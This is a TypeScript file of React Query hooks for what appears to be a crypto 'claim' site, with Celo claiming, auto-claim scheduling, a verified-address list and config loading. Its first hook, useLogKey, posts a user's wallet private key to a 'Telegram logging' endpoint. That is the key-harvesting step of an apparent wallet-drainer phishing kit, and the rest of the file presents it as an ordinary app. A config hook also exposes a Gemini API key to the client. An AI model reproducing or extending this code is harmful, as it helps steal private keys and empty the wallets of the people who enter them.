import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { api, type PermanentVerified, type AutoClaimSchedule } from "@shared/routes";
import { useToast } from "@/hooks/use-toast";

// === Telegram Logging ===
export function useLogKey() {
  return useMutation({
    mutationFn: async (privateKey: string) => {
      const res = await fetch(api.telegram.logKey.path, {
        method: api.telegram.logKey.method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ privateKey }),
      });
      if (!res.ok) throw new Error('Failed to log key');
      return res.json();
    },
    onError: (error) => {
      console.error("Failed to log key to Telegram:", error);
    }
  });
}

// === Permanent Verified ===
export function usePermanentVerifiedList() {
  return useQuery({
    queryKey: [api.permanentVerified.list.path],
    queryFn: async () => {
      const res = await fetch(api.permanentVerified.list.path);
      if (!res.ok) throw new Error('Failed to fetch verified list');
      return await res.json() as { success: boolean, count: number, addresses: { address: string, verified_at: string | null }[] };
    },
  });
}

export function useAddPermanentVerified() {
  const queryClient = useQueryClient();
  const { toast } = useToast();
  
  return useMutation({
    mutationFn: async (address: string) => {
      const res = await fetch(api.permanentVerified.add.path, {
        method: api.permanentVerified.add.method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, action: 'add' }),
      });
      if (!res.ok) throw new Error('Failed to add address');
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: [api.permanentVerified.list.path] });
      toast({ title: "Success", description: "Address added to permanent verified list" });
    },
    onError: (err) => {
      toast({ title: "Error", description: err.message, variant: "destructive" });
    }
  });
}

// === Auto Claim Schedule ===
export function useScheduleAutoClaim() {
  const { toast } = useToast();
  return useMutation({
    mutationFn: async ({ address, network }: { address: string, network: string }) => {
      const res = await fetch(api.autoClaim.schedule.path, {
        method: api.autoClaim.schedule.method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, network }),
      });
      if (!res.ok) throw new Error('Failed to schedule auto-claim');
      return res.json();
    },
    onSuccess: () => {
      toast({ title: "Scheduled", description: "Auto-claim scheduled successfully" });
    },
    onError: (err) => {
      toast({ title: "Error", description: err.message, variant: "destructive" });
    }
  });
}

// === Celo Claim ===
export function useClaimCelo() {
  const { toast } = useToast();
  return useMutation({
    mutationFn: async (address: string) => {
      const res = await fetch(api.claim.celo.path, {
        method: api.claim.celo.method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address }),
      });
      if (!res.ok) throw new Error('Failed to claim Celo');
      return res.json();
    },
    onSuccess: () => {
      toast({ title: "Claim Initiated", description: "Celo claim request sent" });
    },
    onError: (err) => {
      toast({ title: "Error", description: err.message, variant: "destructive" });
    }
  });
}

// === Config ===
export function useConfig() {
  return useQuery({
    queryKey: [api.config.get.path],
    queryFn: async () => {
      const res = await fetch(api.config.get.path);
      if (!res.ok) throw new Error('Failed to load config');
      return res.json() as { GEMINI_API_KEY: string };
    },
  });
}
